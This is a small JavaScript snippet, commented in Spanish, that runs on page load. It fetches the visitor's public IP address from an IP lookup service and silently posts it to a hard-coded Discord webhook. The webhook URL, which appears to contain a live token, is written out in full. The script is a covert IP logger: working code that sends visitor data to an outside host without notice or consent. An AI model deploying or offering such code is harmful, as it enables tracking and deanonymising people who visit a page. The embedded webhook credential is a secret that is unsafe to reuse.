// URL del webhook al que quieres enviar la IP
const webhookUrl = 'https://discord.com/api/webhooks/1238925995046604810/7mt5Uak7gJwgqd0w4nmmBMXY6Id6XAi_Ka_41LWtAV8dNV8JGG4PuG2eb3FaLWFw9zc-';

// Función para obtener la IP del usuario
async function getUserIP() {
    try {
        console.log('Obteniendo IP del usuario...');
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        console.log('IP obtenida:', data.ip);
        return data.ip;
    } catch (error) {
        console.error('Error al obtener la IP:', error);
        return null;
    }
}

// Función para enviar la IP al webhook
async function sendIPToWebhook(ip) {
    if (!ip) {
        console.error('No se pudo obtener la IP.');
        return;
    }

    try {
        console.log('Enviando IP al webhook...');
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ ip: ip }),
        });

        if (response.ok) {
            console.log('IP enviada correctamente al webhook.');
        } else {
            console.error('Error al enviar la IP al webhook:', response.statusText);
        }
    } catch (error) {
        console.error('Error al enviar la IP al webhook:', error);
    }
}

// Obtener y enviar la IP al cargar la página
document.addEventListener('DOMContentLoaded', async () => {
    console.log('Documento cargado. Obteniendo IP...');
    const userIP = await getUserIP();
    console.log('IP obtenida:', userIP);
    await sendIPToWebhook(userIP);
});
